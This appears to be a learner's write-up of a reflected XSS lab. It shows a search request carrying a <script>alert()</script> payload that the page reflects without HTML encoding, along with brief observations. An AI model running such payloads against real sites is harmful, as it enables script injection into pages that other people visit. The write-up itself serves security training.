# Reflected XSS into HTML context with nothing encoded

**Notes**

**My Analysis**

**Req-Res - 1**
 Request:

    search=alert%28%27hello+from+hecker%27%29

Response:

    'alert('hello from hecker')'
**Req-Res - 2**
Request 

    search=<script>alert%28%27hello+from+hecker%27%29<%2Fscript>

Response

    <h1>0 search results for '<script>alert('hello from hecker')</script>'</h1>

 **Observations**
*No input sanitization is done.*
 *Looking at the request-response 2, angle brackets are NOT HTML encoded, therefore we were able to get a popup*

*Note:*
print() can be used instead of alert()
